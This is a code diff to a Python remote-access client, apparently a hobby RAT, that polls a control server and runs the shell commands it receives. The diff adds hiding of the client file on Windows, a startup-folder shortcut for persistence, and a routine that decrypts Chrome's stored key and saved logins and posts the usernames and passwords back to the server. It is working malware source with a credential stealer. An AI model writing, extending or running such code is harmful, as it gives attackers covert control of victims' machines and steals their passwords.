@@ -2,12 +2,17 @@ import requests
 import subprocess 
 import time
 import os
-from datetime import datetime
+from datetime import datetime, timedelta
 import pyautogui
 import tempfile
 import platform
 import shutil
 from math import ceil
+import json
+import base64
+import win32crypt
+from Crypto.Cipher import AES
+import sqlite3
 
 save = tempfile.mkdtemp("screen")
 SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
@@ -17,6 +22,9 @@ response = ""
 
 if platform.system() == 'Windows':
     from win32com.client import Dispatch
+    import win32api
+    import win32con
+    win32api.SetFileAttributes('Client.py',win32con.FILE_ATTRIBUTE_HIDDEN)
     username = os.getlogin()
     destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
     if 'Client.pyw - Shortcut.lnk' not in os.listdir(destination):
@@ -30,6 +38,70 @@ if platform.system() == 'Windows':
                 shortcut.Targetpath = target
                 shortcut.IconLocation = icon
                 shortcut.save()
+
+def get_chrome_datetime(chromedate):
+    converted_date = datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+    return converted_date.strftime('%d-%m-%Y %H:%M:%S')
+
+
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+        
+        
+def extract_chrome_saved_passwords():
+    list_of_data = []
+    local_state_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Local State'.format(os.getlogin())
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    db_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Login Data'.format(os.getlogin())
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute(
+        "select origin_url, action_url, username_value, password_value, date_created,"\
+        "date_last_used from logins order by date_created"
+        )
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decrypt_password(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]        
+        if username or password:
+            list_of_data.append(f"Origin URL    : {origin_url}")
+            list_of_data.append(f"Action URL    : {action_url}")
+            list_of_data.append(f"Username      : {username}")
+            list_of_data.append(f"Password      : {password}")
+        else:
+            continue
+        if date_created != 86400000000 and date_created:
+            list_of_data.append(f"Creation Date : {get_chrome_datetime(date_created)}")
+        if date_last_used != 86400000000 and date_last_used:
+            list_of_data.append(f"Last Used     : {get_chrome_datetime(date_last_used)}")
+        list_of_data.append("")
+    cursor.close()
+    db.close()
+    try:
+        os.remove(filename)
+    except:
+        pass
+    return "\n".join(list_of_data)
+
+
 
 while True:
     try:
@@ -123,6 +195,13 @@ while True:
                                         platform.architecture()[0]
                                         )
                 r = requests.post(SERVER_IP_ADDRESS, data= system_specs)
+
+            elif 'chrome saved passwords' == response.lower().strip():
+                if platform.system() == 'Windows':
+                    chrome_passwords = extract_chrome_saved_passwords()
+                else:
+                    chrome_passwords = 'Machine is not Windows'
+                r = requests.post(SERVER_IP_ADDRESS, data= chrome_passwords)
 
             else:
                 CMD =  subprocess.Popen(response,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
